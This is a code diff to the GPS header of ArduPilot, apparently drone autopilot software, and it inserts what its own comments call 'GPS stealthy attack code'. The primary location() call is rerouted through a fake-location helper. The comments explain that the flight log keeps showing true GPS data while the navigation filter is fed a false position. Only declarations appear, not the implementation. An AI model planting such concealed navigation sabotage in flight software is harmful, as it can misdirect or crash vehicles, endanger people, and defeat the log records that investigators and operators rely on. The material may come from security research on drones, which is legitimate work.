@@ -22,6 +22,8 @@
 #include <AP_Vehicle/AP_Vehicle.h>
 #include "GPS_detect_state.h"
 #include <AP_SerialManager/AP_SerialManager.h>
+#include <AP_InertialSensor/AP_InertialSensor.h>
+
 
 /**
    maximum number of GPS instances available on this platform. If more
@@ -202,9 +204,18 @@ public:
     const Location &location(uint8_t instance) const {
         return state[instance].location;
     }
-    const Location &location() const {
-        return location(primary_instance);
-    }
+
+    //=============GPS stealthy attack code==================
+    //This attack is for a bit higher level signal. 
+    //  location(uint8_t instance) is for lower level data, but I didn't change it,
+    //  So, the log data in the bin file will give the correct GPS data, but EKF
+    //  will use the wrong value.
+
+    const Location &location() const;
+    Location * fake_loc_ptr = new Location();
+    const Location & get_fake_location(const Location& true_loc) const;
+    //=======================================================
+
 
     // report speed accuracy
     bool speed_accuracy(uint8_t instance, float &sacc) const;
@@ -444,6 +455,8 @@ protected:
 
 private:
     static AP_GPS *_singleton;
+
+    AP_InertialSensor * _ins_bob;
 
     // returns the desired gps update rate in milliseconds
     // this does not provide any guarantee that the GPS is updating at the requested
